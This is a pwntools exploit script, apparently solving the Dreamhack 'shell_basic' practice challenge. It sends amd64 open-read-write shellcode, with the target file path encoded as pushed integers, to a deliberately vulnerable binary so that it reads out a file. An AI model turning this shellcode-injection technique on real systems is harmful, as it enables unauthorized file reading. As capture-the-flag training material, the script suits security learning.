#!/usr/bin/python3

from pwn import *

exe = ELF("./shell_basic")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())


if args.REMOTE:
    p = remote('host8.dreamhack.games', 13157)
else:
    p = process([exe.path])
shellcode = asm(
    '''
    xor rax, rax
    push rax
    mov rax, 7453016957746376559
    push rax
    mov rax, 7809087175292972385
    push rax
    mov rax, 7953189135087710051
    push rax
    mov rax, 7598524071439789157
    push rax
    mov rax, 7526411514940450863 
    push rax
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
    mov rax, 60
    mov rdi, 0
    syscall
    ''', arch='amd64')

payload = shellcode
sla(b'shellcode: ', payload)


p.interactive()

